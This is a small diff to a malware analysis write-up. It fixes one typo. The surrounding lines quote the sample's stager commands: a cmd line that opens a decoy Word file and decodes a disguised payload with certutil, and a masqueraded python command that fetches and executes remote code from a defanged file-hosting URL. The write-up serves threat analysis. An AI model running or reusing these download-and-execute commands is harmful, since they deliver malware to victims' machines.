@@ -16,7 +16,7 @@ cmd /c cd "" && start "Google Ads Playbook.docx" && certutil -decode Document.pd
 Sadly I was not able to get my hands on the very initial payload which initated the download due to undisclosable reason hence, the lack of information in this step. But the silver lining is that we have the actual malicious payload and we know the methodology followed by the stager. Let's begin with the actual payload. All the IOCs will be mentioned in the appendix.
 
 ### Initial script
-The initial payload is a python script which is executed in memeory with the following command  
+The initial payload is a python script which is executed in memory with the following command  
 ```
 svchost.exe -c "import.requests;exec(requests.get('hXXp://0x0[.]st/8nyT.py').txt)"
 ```  
